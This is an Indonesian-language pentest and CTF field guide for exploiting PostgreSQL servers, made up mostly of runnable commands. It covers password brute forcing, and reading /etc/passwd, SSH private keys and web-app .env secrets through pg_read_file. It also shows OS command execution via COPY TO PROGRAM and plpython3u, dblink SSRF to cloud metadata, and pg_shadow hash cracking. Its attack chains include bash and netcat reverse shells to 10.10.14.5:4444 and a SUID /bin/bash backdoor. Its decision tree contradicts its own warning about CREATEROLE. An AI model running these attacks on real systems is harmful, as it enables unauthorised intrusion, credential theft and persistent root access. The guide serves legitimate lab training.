---
id: "14c"
title: "14c. PostgreSQL Exploitation Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "14c_postgresql_workflow.md"
refs_out: ["01","03","05","06","07","14a","14b","14d","35","44","60"]
refs_in: ["04","06","14a","14b","14d","17c","22","24","26","32"]
---

# 14c. PostgreSQL Exploitation Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Database Service Exploitation & Privilege Escalation Workflow
SERVICE TARGET     : PostgreSQL Object-Relational Database Management System (ORDBMS)
DEFAULT PORTS      : TCP 5432 (Standard PostgreSQL)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [01. Mindset, Metodologi, dan Workflow Pentesting — Panduan Fundamental](/docs/mindset-dan-metodologi), [03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master), [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh), [14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql)
==================================================================================
```

---

## 🧠 BAGIAN 1: POSTGRESQL FUNDAMENTALS

### 1.1 Apa itu PostgreSQL? (Analogi Sederhana & Perbedaan RDBMS)

**PostgreSQL** (sering disingkat *Postgres*) adalah sistem manajemen basis data objek-relasional (*Object-Relational Database Management System / ORDBMS*) open-source tingkat enterprise yang terkenal dengan kehandalan, kepatuhan standar SQL yang sangat ketat, serta fleksibilitas extensibility (dukungan JSON, custom data types, dan bahasa pemrograman prosedural eksternal).

```text
+=============================================================================+
|                 ANALOGI PERBANDINGAN TIGA RAKSASA DATABASE                  |
+=============================================================================+
|                                                                             |
|  1. MySQL/MariaDB   : "Gudang Logistik Cepat"                               |
|                       Ringan, sangat populer untuk CMS web (WordPress/PHP),  |
|                       fokus utama pada kecepatan query web standar.         |
|                                                                             |
|  2. MSSQL           : "Brankas Perbankan Korporat Windows"                  |
|                       Proprietary Microsoft, terintegrasi ketat dengan      |
|                       Active Directory Windows, Service Manager, dan SMB.   |
|                                                                             |
|  3. PostgreSQL      : "Perpustakaan Riset & Universitas Ilmiah"             |
|                       Open-source enterprise, mendukung fungsi matematika   |
|                       kompleks, JSONB, geospasial, dan arsitektur plugin.   |
|                       Sangat sering ditemukan di backend Django, Rails,     |
|                       aplikasi cloud-native, dan infrastruktur Linux modern.|
|                                                                             |
+=============================================================================+
```

```text
+-------------------+-----------------------------------+-----------------------------------+
| Parameter         | PostgreSQL (Port 5432)            | MySQL / MariaDB (Port 3306)       |
+-------------------+-----------------------------------+-----------------------------------+
| Jenis Sistem      | Object-Relational (ORDBMS)        | Relational (RDBMS)                |
| Akun Default      | `postgres` (Superuser)            | `root` (Superadmin)               |
| Eksekusi OS (RCE) | Built-in via `COPY ... PROGRAM`   | Butuh UDF Plugin / `INTO OUTFILE` |
| Autentikasi Host  | File `pg_hba.conf`                | Tabel `mysql.user` (`user@host`)  |
| Pembacaan File    | Fungsi `pg_read_file()`           | Fungsi `LOAD_FILE()`              |
| Shell Client      | `psql` CLI (Meta-commands `\l`)   | `mysql` CLI                       |
+-------------------+-----------------------------------+-----------------------------------+
```

---

### 1.2 Port 5432 TCP sebagai Pintu Masuk

Port **5432 TCP** adalah port standar default PostgreSQL.
* **Protokol**: Berkomunikasi menggunakan PostgreSQL Frontend/Backend Protocol v3.0 berbasis TCP stream.
* **Enkripsi**: Mendukung negosiasi SSL/TLS secara transparan di port yang sama (tanpa memerlukan port terpisah).

---

### 1.3 Sistem Pengguna & Hak Akses (PostgreSQL Roles & Privileges)

Di PostgreSQL, konsep *user* dan *group* digabungkan menjadi satu entitas universal yang disebut **Role**.

* **`SUPERUSER`**: Peran dengan otoritas tertinggi (setara `root` di Linux atau `sa` di MSSQL). Superuser mengabaikan semua pemeriksaan izin (*permission checks*) di dalam database dan merupakan satu-satunya role yang diizinkan menjalankan **`COPY ... TO PROGRAM`** untuk mengeksekusi perintah sistem operasi server.
* **`pg_read_server_files`**: Role bawaan khusus (PostgreSQL 11+) yang mengizinkan pembacaan file sistem server menggunakan `pg_read_file()`.
* **`pg_write_server_files`**: Role bawaan khusus yang mengizinkan penulisan file sistem server.
* **`pg_execute_server_program`**: Role bawaan khusus yang mengizinkan eksekusi program OS server tanpa harus menjadi superuser penuh.
* **`CREATEDB` & `CREATEROLE`**: Hak membuat database baru atau membuat/memodifikasi role pengguna lain (potensial eskalasi hak akses).

---

### 1.4 File Konfigurasi Host-Based Authentication: `pg_hba.conf`

Keamanan akses jaringan PostgreSQL dikontrol secara terpusat oleh file konfigurasi **`pg_hba.conf`** (Client Authentication Configuration).

* **Format Sintaks `pg_hba.conf`**:
```text
TYPE    DATABASE        USER            ADDRESS                 METHOD
```

* **Contoh Konfigurasi Nyata**:
```text
# Akses lokal via UNIX domain socket untuk user postgres:
local   all             postgres                                peer

# Akses lokal IPv4:
host    all             all             127.0.0.1/32            scram-sha-256

# KONEKSI REMOTE BERBAHAYA (MISKONFIGURASI FATAL!):
host    all             all             0.0.0.0/0               trust
```

* **Daftar Metode Otentikasi (`METHOD`) Penting**:
  * **`trust` (FATAL / CRITICAL)**: Server mempercayai siapa saja yang terhubung **TANPA MEMERIKSA PASSWORD SAMA SEKALI**! Jika diterapkan pada alamat `0.0.0.0/0` atau `all`, penyerang dari luar bisa langsung login sebagai `postgres` superuser tanpa kredensial.
  * **`peer`**: Mengambil nama user dari sistem operasi Linux klien (hanya berlaku untuk koneksi lokal UNIX socket).
  * **`md5`**: Menggunakan hash MD5 dengan salt.
  * **`scram-sha-256`**: Metode modern standar industri berbasis challenge-response yang aman.

---

### 1.5 Apa itu `COPY ... TO/FROM PROGRAM`? ("xp_cmdshell"-nya PostgreSQL)

Diperkenalkan secara resmi pada **PostgreSQL 9.3**, perintah SQL `COPY` diperluas dengan klausa `PROGRAM`. Fitur ini memungkinkan server mengeksekusi program shell sistem operasi secara langsung dan menyalurkan input/output-nya ke tabel database.

```text
+=============================================================================+
|                   MEKANISME RCE VIA COPY ... TO PROGRAM                     |
+=============================================================================+
|                                                                             |
|  [ KLIEN PENTESTER (Parrot OS) ]                                            |
|  Mengirimkan query SQL:                                                     |
|  `COPY (SELECT '') TO PROGRAM '<OS_COMMAND>';`                              |
|                                │                                            |
|                      (TCP Port 5432 Stream)                                 |
|                                ▼                                            |
|  [ SERVER POSTGRESQL (Linux Server Target) ]                                |
|  Daemon `postgres` memanggil sub-proses shell (/bin/sh) dan menjalankan     |
|  perintah tersebut dengan hak akses akun sistem operasi `postgres`!         |
|                                                                             |
+=============================================================================+
```

* **Kenapa Ini Menjadi Vektor Emas di Pentest & CTF?**  
  Fitur ini adalah ekuivalen langsung dari `xp_cmdshell` di MSSQL. Begitu Anda berhasil login sebagai pengguna berstatus `SUPERUSER`, Anda mendapatkan **Remote Code Execution (RCE)** langsung tanpa memerlukan UDF library eksternal!

---

### 1.6 Fungsi Baca File & Direktori: `pg_read_file()` & `pg_ls_dir()`

PostgreSQL menyediakan fungsi bawaan untuk berinteraksi dengan filesystem server:
* **`pg_read_file(filename, offset, length)`**: Membaca konten teks dari file lokal server (misal `/etc/passwd` atau file konfigurasi aplikasi).
* **`pg_ls_dir(dirname)`**: Menampilkan daftar file dan sub-folder di dalam direktori server (seperti perintah `ls`).

---

### 1.7 Ekstensi Berbahaya: `dblink` & `plpython3u`

* **`dblink` Extension**: Mengizinkan database terhubung ke database PostgreSQL lain di jaringan. Di CTF, fitur ini dapat disalahgunakan untuk melakukan **Server-Side Request Forgery (SSRF)** atau pemindaian port internal (*Internal Port Scanning*).
* **`plpython3u` (Untrusted Python Procedural Language)**: Mengizinkan pembuatan fungsi database menggunakan kode Python murni tanpa sandbox, memberikan eksekusi script Python langsung di server.

---

### 1.8 Direktori Data Fisik (`data_directory`)
* Lokasi default di Linux: `/var/lib/postgresql/<versi>/main/`
* Konfigurasi server: `/etc/postgresql/<versi>/main/postgresql.conf` dan `/etc/postgresql/<versi>/main/pg_hba.conf`

---

## 🛠️ BAGIAN 2: TOOL ARSENAL POSTGRESQL

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                        KECEPATAN   PENGGUNAAN DI CTF
=======================================================================================================
psql CLI           Klien interaktif PostgreSQL resmi   Instan      Login, eksekusi query, meta-commands
nmap (NSE)         Brute force & audit port 5432       Cepat       Pendeteksian versi & kredensial
NetExec (nxc)      Batch credential validator          Sangat Cepat Validasi kredensial massal
hydra              Network login brute force           Sedang      Kamus kata sandi port 5432
Metasploit         Automated exploit & scanner         Tinggi      Scanner login & exploit CVE-2019-9193
sqlmap             Database enumeration & direct shell Tinggi      Direct connection `--os-shell`
=======================================================================================================
```

---

### 2.1 `psql` CLI Client — Klien Utama di Parrot OS

* **Instalasi Paket Klien di Parrot OS:**
```bash
which psql || sudo apt update && sudo apt install postgresql-client -y
psql --version
```

* **Daftar Parameter Penting `psql`**:
  * `-h <TARGET_IP>` : Menentukan IP atau hostname server target.
  * `-p <PORT>` : Port koneksi (default: 5432).
  * `-U <USERNAME>` : Username role PostgreSQL (default superuser: `postgres`).
  * `-d <DATABASE>` : Nama database awal (default: `postgres` atau `template1`).
  * `-W` : Memaksa prompt password (jika tidak otomatis meminta).
  * `-w` : Jangan pernah meminta password (berguna untuk menguji `trust` authentication).
  * `-c "<SQL_QUERY>"` : Menjalankan satu query SQL non-interaktif dan langsung keluar.
  * `-f <FILE.SQL>` : Menjalankan seluruh batch query dari file SQL lokal.

```bash
# 1. Connect interaktif standar ke server remote:
psql -h 10.10.11.200 -U postgres -d postgres

# 2. Uji login tanpa password (Trust Auth Check):
psql -h 10.10.11.200 -U postgres -d postgres -w

# 3. Eksekusi single query non-interaktif:
psql -h 10.10.11.200 -U postgres -d postgres -c "SELECT version();"

# 4. Connect lokal via UNIX socket (saat sudah berada di shell Linux target):
sudo -u postgres psql
```

#### 📋 Meta-Commands Penting di dalam Prompt `psql>`:
Berbeda dengan MySQL yang menggunakan query standar `SHOW DATABASES;`, `psql` menggunakan perintah internal (*slash meta-commands*):

```text
+-------------------+-------------------------------------------------------------------+
| Meta-Command      | Fungsi & Hasil yang Ditampilkan                                   |
+-------------------+-------------------------------------------------------------------+
| `\l` atau `\list` | Menampilkan seluruh database yang ada di server.                  |
| `\c <dbname>`     | Berpindah (*connect*) ke database lain.                           |
| `\dt`             | Menampilkan daftar tabel di database saat ini.                    |
| `\d <tablename>`  | Menampilkan skema kolom dan tipe data tabel tertentu.            |
| `\du`             | Menampilkan seluruh roles/pengguna beserta daftar privileges-nya. |
| `\! <command>`    | Menjalankan perintah shell lokal di komputer klien penyerang.     |
| `\q`              | Keluar (*quit*) dari sesi psql.                                   |
+-------------------+-------------------------------------------------------------------+
```

---

### 2.2 Nmap NSE Scripts untuk PostgreSQL

```bash
# 1. Audit informasi versi dan banner port 5432:
nmap -p 5432 -sV -sC 10.10.11.200

# 2. Brute force kredensial PostgreSQL via Nmap NSE:
nmap -p 5432 --script pgsql-brute --script-args "userdb=users.txt,passdb=passwords.txt" 10.10.11.200
```

* **Contoh Output Nyata Nmap `pgsql-brute`**:
```text
PORT     STATE SERVICE
5432/tcp open  postgresql
| pgsql-brute: 
|   Accounts: 
|     postgres:postgres - Valid credentials
|_  Statistics: Performed 24 guesses in 3 seconds
```

---

### 2.3 NetExec (`nxc`) & Hydra — Credential Testing

```bash
# 1. Validasi kredensial via NetExec:
nxc postgres 10.10.11.200 -u 'postgres' -p 'postgres'

# 2. Validasi password kosong:
nxc postgres 10.10.11.200 -u 'postgres' -p ''

# 3. Brute Force Menggunakan Hydra:
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgresql://10.10.11.200 -t 4 -V
```

---

### 2.4 Metasploit Framework PostgreSQL Modules

```bash
# 1. Version Scanner:
msfconsole -q -x "use auxiliary/scanner/postgres/postgres_version; set RHOSTS 10.10.11.200; run; exit"

# 2. Credential Login Scanner:
msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; set RHOSTS 10.10.11.200; set USER_FILE users.txt; set PASS_FILE passwords.txt; run; exit"

# 3. Direct SQL Query Execution:
msfconsole -q -x "use auxiliary/admin/postgres/postgres_sql; set RHOSTS 10.10.11.200; set USERNAME postgres; set PASSWORD postgres; set SQL 'SELECT version();'; run; exit"

# 4. Modul Eksploitasi RCE Paling Populer (CVE-2019-9193 COPY FROM PROGRAM):
msfconsole -q -x "use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS 10.10.11.200; set USERNAME postgres; set PASSWORD postgres; set LHOST 10.10.14.5; set LPORT 4444; run; exit"
```

---

### 2.5 `sqlmap` untuk PostgreSQL

```bash
# Koneksi langsung sqlmap ke PostgreSQL untuk memetakan database:
sqlmap -d "postgresql://postgres:postgres@10.10.11.200:5432/postgres" --dbs

# Dapatkan interaktif command shell langsung dari sqlmap:
sqlmap -d "postgresql://postgres:postgres@10.10.11.200:5432/postgres" --os-shell
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Variabel Operasional di Terminal Parrot OS:
export TARGET="10.10.11.200"
export DB_USER="postgres"
export DB_PASS="postgres"
export DB_NAME="postgres"
```

---

### FASE 1: DETEKSI POSTGRESQL (PORT 5432)

Tujuan: Mengetahui apakah port 5432 terbuka, mengenali banner versi, dan menguji apakah otentikasi `trust` aktif.

```bash
# 1. Scan Nmap Port 5432
sudo nmap -sS -p 5432 -sV $TARGET -oN nmap_pgsql.txt

# 2. Uji Koneksi Tanpa Password (Trust Check Instan via psql)
psql -h $TARGET -U postgres -d postgres -w -c "SELECT 1;" 2>/dev/null \
  && echo "[!] JACKPOT: Trust Authentication Aktif (Login Tanpa Password!)" \
  || echo "[-] Membutuhkan Password."
```

---

### FASE 2: AUTENTIKASI — TESTING KREDENSIAL

1. **Uji Akun Bawaan `postgres`**:
   Di PostgreSQL, superadmin bawaan bernama `postgres`. Kata sandi default di lingkungan lab/CTF yang sering berhasil:
   * `postgres` : `postgres`
   * `postgres` : `password`
   * `postgres` : `admin`
   * `postgres` : `root`
   * `postgres` : `""` (kosong)

```bash
# Uji coba login interaktif:
psql -h $TARGET -U postgres -d postgres
```

2. **Bypass Otentikasi Lokal (`peer` / `trust` via Shell Target)**:
   Jika Anda sudah memiliki akses shell Linux di target (misal sebagai `www-data`):
```bash
# Masuk langsung ke konsol database menggunakan akun sistem postgres:
sudo -u postgres psql

# Atau langsung eksekusi query sebagai postgres:
sudo -u postgres psql -c "SELECT current_user;"
```

---

### FASE 3: POSTGRESQL RECONNAISSANCE (10 QUERY WAJIB)

Segera setelah masuk ke prompt `postgres=#`, jalankan 10 query reconnaissance berikut:

```sql
-- 1. Cek Versi Lengkap PostgreSQL & Arsitektur OS:
SELECT version();

-- 2. Cek Pengguna Aktif:
SELECT current_user;

-- 3. Cek Kapan Layanan Database Dimulai (Uptime Server):
SELECT pg_postmaster_start_time();

-- 4. VERIFIKASI APAKAH KITA MEMILIKI HAK SUPERUSER (KUNCI RCE):
SELECT usesuper FROM pg_user WHERE usename = current_user;
-- Jika hasilnya 't' (true), Anda memiliki izin eksekusi COPY TO PROGRAM!

-- 5. Tampilkan Seluruh Database:
SELECT datname FROM pg_database;

-- 6. Tampilkan Seluruh Roles & Privileges:
SELECT rolname, rolsuper, rolinherit, rolcreaterole, rolcreatedb FROM pg_roles;

-- 7. Tampilkan Daftar Tabel di Skema Publik:
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- 8. Baca Aturan Keamanan Host pg_hba.conf Secara Langsung (PostgreSQL 10+):
SELECT line_number, type, database, user_name, address, auth_method FROM pg_hba_file_rules();

-- 9. Cek Lokasi Direktori Data Fisik Server:
SHOW data_directory;

-- 10. Tampilkan Seluruh Ekstensi Database yang Terpasang:
SELECT * FROM pg_extension;
```

---

### FASE 4: FILE READ VIA POSTGRESQL (`pg_read_file`)

Jika Anda memiliki hak akses `SUPERUSER` atau role `pg_read_server_files`:

```sql
-- 1. Baca daftar pengguna sistem operasi (/etc/passwd):
SELECT pg_read_file('/etc/passwd');

-- 2. Baca file konfigurasi host PostgreSQL:
SELECT pg_read_file('/etc/postgresql/13/main/pg_hba.conf');

-- 3. Baca SSH Private Key milik daemon postgres jika tersedia:
SELECT pg_read_file('/var/lib/postgresql/.ssh/id_rsa');

-- 4. Telusuri daftar file di dalam suatu folder menggunakan pg_ls_dir():
SELECT pg_ls_dir('/var/lib/postgresql');
SELECT pg_ls_dir('/var/www/html');
SELECT pg_ls_dir('/opt');
SELECT pg_ls_dir('/home');
```

#### 🌐 Berburu Kredensial Database dari Framework Web Populer (Django / Rails / Laravel / Node.js)
Di mesin CTF, PostgreSQL hampir selalu menjadi backend untuk aplikasi web berbasis Python, Ruby, PHP, atau JavaScript. Gunakan `pg_read_file()` untuk mengekstrak kredensial dari file konfigurasi standar berikut:

```sql
-- 1. Django Applications (Python) — Cari blok DATABASES['default']:
SELECT pg_read_file('/var/www/html/settings.py');
SELECT pg_read_file('/var/www/html/app/settings.py');
SELECT pg_read_file('/opt/app/core/settings.py');

-- 2. Ruby on Rails Applications — Cari blok production.password:
SELECT pg_read_file('/var/www/app/config/database.yml');
SELECT pg_read_file('/opt/rails_project/config/database.yml');

-- 3. Laravel / Symfony / PHP — Cari DB_PASSWORD dan DB_USERNAME:
SELECT pg_read_file('/var/www/html/.env');
SELECT pg_read_file('/var/www/html/config/database.php');

-- 4. Node.js / Express / NestJS:
SELECT pg_read_file('/var/www/app/.env');
SELECT pg_read_file('/opt/app/config/database.json');
SELECT pg_read_file('/opt/app/config/default.json');
```

* **Menyimpan File Target Langsung ke Mesin Parrot OS**:
```bash
psql -h $TARGET -U postgres -d postgres -t -c "SELECT pg_read_file('/etc/passwd');" > /tmp/target_passwd.txt
```

---

### FASE 5: RCE VIA `COPY ... TO/FROM PROGRAM`

> [!IMPORTANT]
> **PRASYARAT EKSEKUSI RCE:**  
> 1. Akun Anda harus memiliki atribut **`SUPERUSER`** (atau keanggotaan dalam role `pg_execute_server_program` di PostgreSQL versi baru).  
> 2. Versi PostgreSQL adalah **9.3 ke atas**.

#### 1. Sintaks Eksekusi Perintah Sistem Dasar
```sql
-- Eksekusi perintah sistem sederhana (Output diarahkan ke /tmp/):
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt';
COPY (SELECT '') TO PROGRAM 'whoami > /tmp/whoami.txt';
```

#### 2. Verifikasi Hasil Eksekusi Perintah via `pg_read_file()`
```sql
SELECT pg_read_file('/tmp/whoami.txt');
-- Output: postgres
```

#### 3. Alternatif Sintaks: `COPY ... FROM PROGRAM` (Menangkap Output Langsung ke Tabel)
Metode ini sangat populer karena output perintah sistem langsung dimuat ke dalam tabel database sehingga bisa dibaca menggunakan `SELECT`:

```sql
-- Step 1: Buat tabel sementara untuk menampung baris output
CREATE TABLE cmd_output(output text);

-- Step 2: Jalankan perintah dan salin outputnya ke dalam tabel
COPY cmd_output FROM PROGRAM 'id; uname -a; ip a';

-- Step 3: Baca hasilnya secara langsung di terminal psql
SELECT * FROM cmd_output;

-- Step 4: Bersihkan tabel setelah selesai
DROP TABLE cmd_output;
```

#### 4. Spawn Reverse Shell Menggunakan `COPY TO PROGRAM`
```sql
-- Template eksekusi reverse shell ke listener Parrot OS:
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';
```

```bash
# Listener di Parrot OS:
nc -lvnp 4444
# Begitu query dieksekusi di psql, koneksi shell masuk sebagai user 'postgres'!
```

---

### FASE 6: EXTENSION ABUSE (`dblink` & `plpython3u`)

#### 1. SSRF & Internal Port Scanning Menggunakan `dblink`
Jika ekstensi `dblink` aktif, Anda bisa memicu koneksi jaringan keluar dari server database:
```sql
-- Aktifkan ekstensi jika belum terpasang:
CREATE EXTENSION IF NOT EXISTS dblink;

-- A. Port Scanning Menggunakan dblink_connect dengan timeout:
-- Jika koneksi sukses menghasilkan 'OK' ➔ Port TERBUKA (OPEN)
-- Jika timeout atau connection refused ➔ Port TERTUTUP (CLOSED / FILTERED)
SELECT dblink_connect('port_test', 'host=192.168.1.1 port=22 connect_timeout=3');
SELECT dblink_disconnect('port_test');

-- B. SSRF ke Cloud Metadata Endpoint (AWS / GCP / OpenStack):
SELECT * FROM dblink('host=169.254.169.254 user=postgres dbname=postgres connect_timeout=3', 'SELECT 1') AS t1(res int);
```

#### 2. RCE Menggunakan Untrusted Python (`plpython3u`)
Jika administrator memasang modul bahasa prosedural Python:
```sql
-- Daftarkan bahasa Python untrusted:
CREATE EXTENSION IF NOT EXISTS plpython3u;

-- Buat fungsi eksekusi perintah:
CREATE OR REPLACE FUNCTION run_cmd(command text)
RETURNS text AS $$
    import subprocess
    return subprocess.getoutput(command)
$$ LANGUAGE plpython3u;

-- Jalankan perintah:
SELECT run_cmd('id');
-- Output: uid=106(postgres) gid=113(postgres) groups=113(postgres)
```

---

### FASE 7: CREDENTIAL EXTRACTION & CRACKING

```sql
-- Ekstrak daftar hash password dari tabel sistem pg_shadow:
SELECT usename, passwd FROM pg_shadow;
```

* **Format Hash PostgreSQL & Mekanisme Salting**:
  1. **Format MD5 Klasik**: Diawali string `md5` diikuti 32 karakter hex.
     * Rumus hashing: `md5(password + username)`
     * **Artinya: `username` adalah SALT!** PostgreSQL tidak menggunakan salt acak untuk hash MD5, melainkan menggabungkan password dengan nama pengguna itu sendiri.
  2. **Format SCRAM-SHA-256 (Modern)**: Diawali `SCRAM-SHA-256$...` (menggunakan HMAC-SHA-256 dengan 4096 iterasi dan salt acak, **TIDAK BISA** di-crack menggunakan mode 10).

```bash
# Cracking Hash MD5 PostgreSQL Menggunakan Hashcat:
# Contoh format di pg_shadow: md53175bce1d3201d16594cebf9d7eb3f9d (untuk user 'postgres')
# Langkah: Buang 3 karakter pertama ('md5'), lalu tambahkan :<username> sebagai salt:
echo "3175bce1d3201d16594cebf9d7eb3f9d:postgres" > pgsql.hash

# Gunakan Hashcat Mode 10 (md5($pass.$salt)):
hashcat -m 10 pgsql.hash /usr/share/wordlists/rockyou.txt
```

---

## 🚀 BAGIAN 4: POSTGRESQL PRIVILEGE ESCALATION

### 4.1 Audit Hak Akses Role & Privilege Escalation Realistis

> [!WARNING]
> **MISKONSEPSI UMUM TENTANG `CREATEROLE`:**  
> Banyak pemula mengira bahwa role dengan hak `CREATEROLE` dapat langsung menjalankan `ALTER USER myuser WITH SUPERUSER`. **Ini keliru!** Di PostgreSQL, hanya akun yang sudah berstatus `SUPERUSER` yang diizinkan untuk memberikan hak `SUPERUSER` ke role lain. Jika dijalankan oleh non-superuser, PostgreSQL akan menolak dengan pesan: `ERROR: must be superuser to alter superusers`.

#### Vektor Eskalasi Privilese yang Sebenarnya di PostgreSQL:

1. **Role Membership Inheritance**:
   Jika administrator menambahkan user Anda ke dalam salah satu role sistem bawaan yang memiliki privilese tinggi:
   ```sql
   -- Cek keanggotaan role dan atribut:
   \du
   -- Jika role Anda adalah anggota dari:
   -- ➔ pg_read_server_files   : Anda bisa membaca file sistem OS via pg_read_file()!
   -- ➔ pg_execute_server_program : Anda bisa menjalankan perintah OS via COPY TO PROGRAM tanpa status SUPERUSER!
   ```

2. **Penyalahgunaan Fungsi `SECURITY DEFINER`**:
   Fungsi dengan atribut `SECURITY DEFINER` dieksekusi dengan hak akses pemilik fungsi (*function creator*), bukan pengguna yang memanggilnya. Jika superuser membuat fungsi `SECURITY DEFINER` di skema publik tanpa membatasi `search_path`:
   ```sql
   -- Cari fungsi yang memiliki hak SECURITY DEFINER:
   SELECT proname, prosecdef, proowner::regrole FROM pg_proc WHERE prosecdef = true;
   ```

3. **Eskalasi Ekstensi (CVE-2023-2454)**:
   Pada PostgreSQL versi rentan (11.0–15.2), pengguna dengan hak `CREATE` pada suatu database dapat memanipulasi skema objek ekstensi saat perintah instalasi dijalankan oleh superuser, memungkinkan eksekusi kode sewenang-wenang sebagai superuser.

---

### 4.2 PostgreSQL di Windows ➔ Escalation via `SeImpersonatePrivilege`
Jika target Anda adalah mesin Windows yang menjalankan PostgreSQL service:
1. RCE via `COPY TO PROGRAM` menghasilkan shell di bawah akun service **`NETWORK SERVICE`** atau **`NT SERVICE\postgresql-x64-<versi>`**.
2. Service PostgreSQL di Windows secara default memiliki hak **`SeImpersonatePrivilege`** aktif.
3. Gunakan potato exploit ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)) seperti *GodPotato* atau *SweetPotato* untuk eskalasi instan ke **`NT AUTHORITY\SYSTEM`**!

---

## 🔗 BAGIAN 5: POSTGRESQL ATTACK CHAINING

```text
+=============================================================================+
|                     POSTGRESQL ATTACK CHAINING TAXONOMY                     |
+=============================================================================+
```

### 🔗 Chain 1: Port 5432 Open ➔ Trust Auth ➔ `COPY TO PROGRAM` ➔ Reverse Shell ➔ Root

```text
[ Port 5432 Open ] ──> psql -h $TARGET -U postgres -d postgres -w (Trust Success!)
                                     │
                                     ▼
[ COPY TO PROGRAM ] ──> COPY (SELECT '') TO PROGRAM 'bash -c "<reverse_shell>"'
                                     │
                                     ▼
[ Netcat Listener ] ──> Akses shell diperoleh sebagai akun Linux 'postgres'
                                     │
                                     ▼
[ Sudo PrivEsc ] ──> sudo -l ➔ sudo /bin/bash ➔ FULL ROOT ACCESS!
```

---

### 🔗 Chain 2: Web App Config ➔ PostgreSQL Login ➔ `pg_read_file` ➔ SSH Key

```text
[ LFI di Web App ] ──> Temukan database credentials di wp-config.php / .env
                                     │
                                     ▼
[ Login PostgreSQL ] ──> psql -h $TARGET -U appuser -d production
                                     │
                                     ▼
[ pg_read_file() ] ──> SELECT pg_read_file('/home/dev/.ssh/id_rsa');
                                     │
                                     ▼
[ Parrot OS CLI ] ──> chmod 600 id_rsa ──> ssh -i id_rsa dev@$TARGET
```

---

### 🔗 Chain 3: SQL Injection via Web ➔ Stacked Queries ➔ `COPY TO PROGRAM` RCE

Jika aplikasi web rentan terhadap SQLi pada backend PostgreSQL yang mendukung stacked query (tanda titik koma `;`):
```text
Payload Web URL:
http://target.com/item?id=1; COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.5 4444 >/tmp/f';--
                                     │
                                     ▼
[ PostgreSQL Engine ] ──> Memproses query kedua ➔ Eksekusi biner shell OS!
```

---

### 🔗 Chain 4: Low-Priv Linux Shell ➔ `pg_hba.conf` Local Trust ➔ Root Compromise

```text
[ Shell www-data ] ──> Baca /etc/postgresql/*/main/pg_hba.conf (Ada aturan 'local all all trust')
                                     │
                                     ▼
[ Local Connect ] ──> psql -U postgres (Langsung masuk superuser tanpa password!)
                                     │
                                     ▼
[ Biner Backdoor ] ──> COPY (SELECT '') TO PROGRAM 'chmod u+s /bin/bash'
                                     │
                                     ▼
[ Terminal Target ] ──> /bin/bash -p ➔ INSTANT ROOT COMPROMISE!
```

---

## 🛑 BAGIAN 6: CVE REFERENCE (CRITICAL VULNERABILITIES)

```text
+-----------------------+-------------------+-------------------------------+-------------------------------------------+
| Kerentanan            | CVE ID            | Versi Target                  | Dampak & Vektor Eksploitasi               |
+-----------------------+-------------------+-------------------------------+-------------------------------------------+
| COPY FROM/TO PROGRAM  | CVE-2019-9193     | PostgreSQL 9.3 s/d 11.2       | **Authenticated Remote Code Execution**.  |
| Command Execution     |                   |                               | Fitur resmi yang dieksploitasi untuk RCE. |
+-----------------------+-------------------+-------------------------------+-------------------------------------------+
| Extension Privilege   | CVE-2023-2454     | PostgreSQL 11.0 s/d 11.19,    | **Privilege Escalation**. Pengguna biasa  |
| Escalation via CREATE |                   | 12.0 s/d 12.14, 13.0-13.10    | memodifikasi skema ekstensi untuk eksekusi|
| FUNCTION              |                   | 14.0-14.7, 15.0-15.2          | fungsi sewenang-wenang sebagai superuser. |
+-----------------------+-------------------+-------------------------------+-------------------------------------------+
| Client Code Execution | CVE-2018-1058     | PostgreSQL 9.3 s/d 10.2       | **Trojan Function Hijacking via Search    |
| (Search Path Hijack)  |                   |                               | Path**. Membuat fungsi jahat di skema     |
|                       |                   |                               | publik yang dipanggil oleh superuser.     |
+-----------------------+-------------------+-------------------------------+-------------------------------------------+
```

---

## 🌳 BAGIAN 7: MASTER DECISION TREE POSTGRESQL

```text
                         [PORT 5432 (POSTGRESQL) TERBUKA]
                                        │
                                        ▼
                        [UJI LOGIN USER 'postgres' BLANK]
                        psql -h $TARGET -U postgres -w
                                        │
                     ┌──────────────────┴──────────────────┐
                     │                                     │
             [TRUST AUTH AKTIF]                    [MEMINTA PASSWORD]
                     │                                     │
                     │                     ┌───────────────┴───────────────┐
                     │                     │                               │
                     │            [TEST CREDENTIAL REUSE]          [BRUTE FORCE]
                     │            Password dari Web/.env/SSH       hydra / pgsql-brute
                     │                     │                               │
                     │                     └───────────────┬───────────────┘
                     │                                     │
                     └──────────────────┬──────────────────┘
                                        │
                           [BERHASIL MASUK KONSOL psql]
                                        │
                                        ▼
                             [CEK ATRIBUT SUPERUSER]
                        SELECT usesuper FROM pg_user...
                                        │
                 ┌──────────────────────┴──────────────────────┐
                 │                                             │
         [usesuper: TRUE]                              [usesuper: FALSE]
                 │                                             │
                 ▼                                     ┌───────┴───────┐
       [RCE VIA COPY TO PROGRAM]                       │               │
  COPY (SELECT '') TO PROGRAM...              [CEK CREATEROLE]   [pg_read_file()]
                 │                            ALTER USER TO      Baca /etc/passwd
                 ▼                            SUPERUSER          dan config web
     [REVERSE SHELL SEBAGAI                            │               │
        USER 'postgres']                               └───────┬───────┘
                 │                                             │
                 ▼                                             ▼
       [LINUX PRIVILEGE ESCALATION]                   [DUMP DATABASE DATA]
       sudo -l / LinPEAS ➔ ROOT!                      Tabel users & password hashes
